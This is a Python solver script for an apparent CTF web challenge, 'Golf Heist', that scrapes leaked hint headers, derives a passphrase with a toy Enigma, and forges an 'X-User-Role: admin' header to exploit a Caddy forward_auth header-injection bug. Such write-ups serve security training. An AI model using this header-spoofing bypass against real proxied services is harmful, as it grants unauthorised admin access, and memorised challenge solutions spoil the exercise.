#!/usr/bin/env python3
"""
Golf Heist solver — CSAW 2026 web challenge.

1. Reads rotor settings from 418 teapot response headers.
2. Derives the passphrase through a three-rotor Enigma.
3. Injects X-User-Role: admin via Caddy forward_auth header bug.

Usage:
  python solve.py https://golf-heist.ctf.csaw.io
"""
import base64
import json
import sys
import requests

B = sys.argv[1] if len(sys.argv) > 1 else "https://golf-heist.ctf.csaw.io"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"

ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {
    "I":   "EKMFLGDQVZNTOWYHXUSPAIBRCJ",
    "II":  "AJDKSIRUXBLHWTMCQGZNPYFVOE",
    "III": "BDFHJLCPRTXVZNYEIWGAKMUSQO",
    "REF": "YRUHQSLDPXNGOKMIEBFZCWVJAT",
}


def enigma(r1, r2, r3):
    def f(c, w, o):
        return w[(ALPHA.index(c) + o) % 26]
    out = []
    for sym in ["G", "O", "L"]:
        c = sym
        c = f(c, W["I"], r1 % 26)
        c = f(c, W["II"], r2 % 26)
        c = f(c, W["III"], r3 % 26)
        c = W["REF"][ALPHA.index(c)]
        c = f(c, W["III"], (26 - r3 % 26) % 26)
        out.append(c)
    return out


def main():
    # 1) leak rotor settings from the teapot endpoints
    rot = {}
    for path, key in (("clubs", "r1"), ("balls", "r2"), ("bags", "r3")):
        r = s.get(f"{B}/pro-shop/inventory/{path}", timeout=20)
        h = r.headers.get("X-Golf-Hint", "")
        rot[key] = int(base64.b64decode(h).decode())
        print(f"[*] {path:6} {r.status_code} hint={h} -> {key}={rot[key]}")

    # 2) derive the passphrase (word indices are 0, 1, 0)
    letters = enigma(rot["r1"], rot["r2"], rot["r3"])
    words = s.get(f"{B}/api/word-table", timeout=20).json()["table"]
    phrase = " ".join([words[letters[0]][0], words[letters[1]][1], words[letters[2]][0]])
    print(f"[*] rotor letters : {letters}")
    print(f"[+] phrase        : {phrase!r}")

    # 3) header injection through the caddy (GHSA-7r4p-vjf4-gxv4)
    r = s.post(
        f"{B}/api/vault/admin-item",
        json={"phrase": phrase},
        headers={"X-User-Role": "admin", "X-User-Id": "caddy"},
        timeout=20,
    )
    print(f"[*] admin-item    : {r.status_code}")
    print(json.dumps(r.json(), indent=2)[:1200])


if __name__ == "__main__":
    main()
